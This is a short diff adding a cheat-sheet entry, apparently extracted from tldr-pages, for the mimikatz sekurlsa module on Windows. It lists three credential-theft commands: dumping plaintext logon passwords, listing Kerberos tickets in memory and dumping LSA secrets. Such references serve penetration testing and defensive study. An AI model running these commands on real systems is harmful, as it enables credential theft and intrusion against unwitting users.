@@ -1,0 +1,13 @@
+; This has been extracted from
+; https://github.com/tldr-pages/tldr/blob/master/pages/windows/mimikatz-sekurlsa.md
+
+% mimikatz-sekurlsa, windows
+
+# Extract plaintext passwords
+mimikatz "sekurlsa::logonpasswords"
+
+# List Kerberos tickets in memory
+mimikatz "sekurlsa::tickets"
+
+# Dump LSA secrets
+mimikatz "sekurlsa::secrets"
